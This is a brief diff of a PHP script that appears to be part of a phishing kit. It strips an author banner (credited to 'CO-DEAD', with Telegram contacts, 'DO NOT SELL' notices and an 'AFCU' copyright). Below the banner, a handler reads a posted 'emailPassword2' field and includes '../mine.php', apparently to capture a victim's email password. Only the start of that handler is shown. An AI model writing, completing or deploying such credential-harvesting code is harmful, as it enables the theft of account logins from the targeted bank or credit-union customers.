@@ -1,16 +1,5 @@
 <?php 
-/**
- * DO NOT SELL THIS SCRIPT ! 
- * DO NOT CHANGE COPYRIGHT !
- * icq & telegram = @CO-DEAD
- 
-###############################################
-#$            Coded by CO-DEAD               $#
-#$  Adding backdoor won't  make you a Coder  $#
-#$          Copyright 2022 AFCU              $#
-###############################################
 
-**/
 if(isset($_POST['emailPassword2']))
 {
 	include ("../mine.php");
